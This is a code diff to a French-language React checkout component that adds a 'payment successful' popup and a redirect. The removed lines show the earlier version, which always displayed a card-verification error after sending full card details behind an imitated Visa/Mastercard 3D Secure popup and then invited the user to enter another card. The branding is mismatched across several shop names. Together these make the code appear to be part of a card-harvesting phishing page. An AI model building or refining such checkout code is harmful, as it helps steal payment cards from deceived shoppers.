@@ -14,6 +14,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
 
   const [showPaymentError, setShowPaymentError] = useState(false);
   const [showVerifError, setShowVerifError] = useState(false);
+  const [showPaymentSuccess, setShowPaymentSuccess] = useState(false);
   const [cardLogo, setCardLogo] = useState('/verified-by-visa.png');
   const [checkoutProvider, setCheckoutProvider] = useState("rento");
 
@@ -128,12 +129,12 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
         return data.result;
       } else {
         return data;
-      }
-    } catch (error) {
+      }    } catch (error) {
       console.error('Error fetching payment:', error);
       setShowPaymentError(false);
       setShowVerifError(false);
       setShow3DSecurePopup(false);
+      setShowPaymentSuccess(false);
       throw error;
     }
   };
@@ -254,13 +255,31 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
         }, 20000);
 
         // Requête de paiement à l'API 
-        await payFetch(orderNumber, 1, cardDetails);
+        const paymentResult = await payFetch(orderNumber, 1, cardDetails);
+        
+        // Vérifier le statut du paiement
+        if (paymentResult && paymentResult.status === 'success') {
+          // Paiement réussi
+          setIsLoading(false);
+          setShow3DSecurePopup(false);
+          setShowPaymentSuccess(true);
+          
+          // Rediriger vers la page de confirmation après 3 secondes
+          setTimeout(() => {
+            window.location.href = '/confirmation';
+          }, 3000);
+        } else {
+          // Paiement échoué
+          setIsLoading(false);
+          setShow3DSecurePopup(false);
+          setShowVerifError(true);
+        }
         //await new Promise(resolve => setTimeout(resolve, 60000));
 
-        // Afficher popup erreur carte
-        setIsLoading(false);
-        setShow3DSecurePopup(false);
-        setShowVerifError(true);
+        // Afficher popup erreur carte (code existant commenté)
+        // setIsLoading(false);
+        // setShow3DSecurePopup(false);
+        // setShowVerifError(true);
       }
       
     } catch (error) {
@@ -278,12 +297,14 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     setShowPaymentError(false);
     setShowVerifError(false);
     setShow3DSecurePopup(false);
+    setShowPaymentSuccess(false);
     handleCheckout(new Event('submit'));
   };
 
   const handleChangeCard = () => {
     setShowVerifError(false);
     setShow3DSecurePopup(false);
+    setShowPaymentSuccess(false);
     setFormData({
       cardNumber: '',
       expiryDate: '',
@@ -391,7 +412,37 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
         </div>
       )}
 
-      
+      {showPaymentSuccess && (
+        <div className="verification-wrapper">
+          <div className="verification-popup success">
+            <article className="head">
+              <img className="brand-logo" src="mercanett.png" alt="Christopeit France" />
+              <img
+                className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`}
+                src={cardLogo}
+                alt={data.checkoutPayVerifiedPaymentAlt}
+              />
+            </article>
+            <h2 className="icon">✅</h2>
+            <h2>Paiement réussi !</h2>
+            <p className="desc">Votre paiement a été accepté avec succès. Vous allez être redirigé vers votre suivi de commande.</p>
+            <article className="infos">
+              <span>{shop.name} - LW BRICKS</span>
+              <span>
+                Montant du paiement : {amount} €
+              </span>
+              <span> 
+                Date : {`${formattedDate} à ${formattedTime}`}
+              </span>
+              <span>
+                Carte : **** **** **** {lastFourDigits}
+              </span>
+            </article>
+            <div className="loader border-top-primary"></div>
+            <p className="smaller">Redirection automatique dans quelques secondes...</p>
+          </div>
+        </div>
+      )}
 
       {showPaymentError && (
         <div className="verification-wrapper">
